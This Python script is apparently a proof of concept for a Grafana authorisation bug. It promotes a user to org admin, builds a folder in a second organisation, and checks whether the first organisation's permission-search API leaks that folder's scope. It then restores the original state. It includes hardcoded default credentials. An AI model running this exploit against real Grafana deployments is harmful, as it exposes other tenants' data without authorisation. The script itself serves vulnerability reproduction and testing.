#!/usr/bin/env python3
import argparse
import json
import os
import sys
import time

cwd = os.getcwd()
sys.path = [p for p in sys.path if p not in ('', cwd)]
import requests


def fail(msg):
    print(f"FAIL: {msg}")
    raise SystemExit(1)


def req(session, method, url, **kwargs):
    r = session.request(method, url, timeout=20, **kwargs)
    return r


def login(base, username, password):
    s = requests.Session()
    r = req(s, 'POST', f'{base}/login', json={'user': username, 'password': password})
    if r.status_code != 200:
        fail(f'login failed for {username}: HTTP {r.status_code} {r.text[:200]}')
    return s


def get_json(resp, label):
    try:
        return resp.json()
    except Exception:
        fail(f'{label} did not return JSON: HTTP {resp.status_code} {resp.text[:300]}')


def main():
    ap = argparse.ArgumentParser(description='Reproduce Grafana cross-org permission search leak via action-set SQL precedence')
    ap.add_argument('--url', default=os.environ.get('GRAFANA_URL', 'http://localhost:31655'))
    ap.add_argument('--admin-user', default=os.environ.get('GRAFANA_ADMIN_USER', 'admin'))
    ap.add_argument('--admin-pass', default=os.environ.get('GRAFANA_ADMIN_PASS', '7erSflXeXmPF47qDOkAc'))
    ap.add_argument('--editor-user', default=os.environ.get('GRAFANA_EDITOR_USER', 'editor'))
    ap.add_argument('--editor-pass', default=os.environ.get('GRAFANA_EDITOR_PASS', '7ZhgiZfCQxSYu2MtlRIg'))
    ap.add_argument('--viewer-login', default=os.environ.get('GRAFANA_VIEWER_LOGIN', 'viewer'))
    args = ap.parse_args()
    base = args.url.rstrip('/')
    stamp = str(int(time.time()))
    org_name = f'tf-cross-org-folder-{stamp}'
    folder_title = f'tf-cross-folder-{stamp}'

    admin = login(base, args.admin_user, args.admin_pass)
    created_org = None
    folder_uid = None
    editor_original_role = None
    editor_id = None
    viewer_id = None

    try:
        r = req(admin, 'GET', f'{base}/api/orgs/1/users')
        if r.status_code != 200:
            fail(f'cannot list org 1 users: HTTP {r.status_code} {r.text[:200]}')
        for u in get_json(r, 'org users'):
            if u.get('login') == args.editor_user or u.get('email') == args.editor_user:
                editor_id = int(u.get('userId') or u.get('id'))
                editor_original_role = u.get('role')
            if u.get('login') == args.viewer_login or u.get('email') == args.viewer_login:
                viewer_id = int(u.get('userId') or u.get('id'))
        if not editor_id or not viewer_id:
            fail('could not resolve editor/viewer user IDs from /api/orgs/1/users')

        r = req(admin, 'PATCH', f'{base}/api/orgs/1/users/{editor_id}', json={'role': 'Admin'})
        if r.status_code != 200:
            fail(f'could not promote editor in org 1: HTTP {r.status_code} {r.text[:200]}')

        editor = login(base, args.editor_user, args.editor_pass)
        r = req(editor, 'GET', f'{base}/api/access-control/users/permissions/search?actionPrefix=folders&namespacedId=user:{viewer_id}')
        if r.status_code != 200:
            fail(f'baseline permission search failed: HTTP {r.status_code} {r.text[:200]}')
        baseline = r.text

        r = req(admin, 'POST', f'{base}/api/orgs', json={'name': org_name})
        if r.status_code != 200:
            fail(f'could not create second org: HTTP {r.status_code} {r.text[:200]}')
        created_org = int(get_json(r, 'create org').get('orgId') or 0)
        if not created_org:
            fail('create org response lacked orgId')

        r = req(admin, 'POST', f'{base}/api/orgs/{created_org}/users', json={'loginOrEmail': args.viewer_login, 'role': 'Viewer'})
        if r.status_code not in (200, 409):
            fail(f'could not add viewer to second org: HTTP {r.status_code} {r.text[:200]}')

        r = req(admin, 'POST', f'{base}/api/user/using/{created_org}')
        if r.status_code != 200:
            fail(f'could not switch admin to second org: HTTP {r.status_code} {r.text[:200]}')

        r = req(admin, 'POST', f'{base}/api/folders', json={'title': folder_title})
        if r.status_code != 200:
            fail(f'could not create org-2 folder: HTTP {r.status_code} {r.text[:200]}')
        folder_uid = get_json(r, 'create folder').get('uid')
        if not folder_uid:
            fail('create folder response lacked uid')

        r = req(admin, 'POST', f'{base}/api/access-control/folders/{folder_uid}/users/{viewer_id}', json={'permission': 'View'})
        if r.status_code != 200:
            fail(f'could not grant viewer org-2 folder view: HTTP {r.status_code} {r.text[:200]}')

        r = req(admin, 'POST', f'{base}/api/user/using/1')
        if r.status_code != 200:
            fail(f'could not switch admin back to org 1: HTTP {r.status_code} {r.text[:200]}')

        editor = login(base, args.editor_user, args.editor_pass)
        r = req(editor, 'GET', f'{base}/api/access-control/users/permissions/search?actionPrefix=folders&namespacedId=user:{viewer_id}')
        if r.status_code != 200:
            fail(f'post-fixture permission search failed: HTTP {r.status_code} {r.text[:200]}')
        leaked_scope = f'folders:uid:{folder_uid}'
        if leaked_scope in r.text and leaked_scope not in baseline:
            print(f'PASS: org-1 permission search leaked org-{created_org} folder scope {leaked_scope}')
            print(f'baseline={baseline}')
            print(f'after={r.text}')
        else:
            fail(f'expected leaked scope {leaked_scope}; baseline={baseline}; after={r.text}')
    finally:
        try:
            if folder_uid and created_org:
                req(admin, 'POST', f'{base}/api/user/using/{created_org}')
                req(admin, 'DELETE', f'{base}/api/folders/{folder_uid}?forceDeleteRules=false')
        except Exception as e:
            print(f'WARN: folder cleanup failed: {e}')
        try:
            req(admin, 'POST', f'{base}/api/user/using/1')
        except Exception as e:
            print(f'WARN: org switch cleanup failed: {e}')
        try:
            if editor_original_role and editor_id:
                req(admin, 'PATCH', f'{base}/api/orgs/1/users/{editor_id}', json={'role': editor_original_role})
        except Exception as e:
            print(f'WARN: editor role restore failed: {e}')
        try:
            if created_org:
                req(admin, 'DELETE', f'{base}/api/orgs/{created_org}')
        except Exception as e:
            print(f'WARN: org cleanup failed: {e}')


if __name__ == '__main__':
    main()
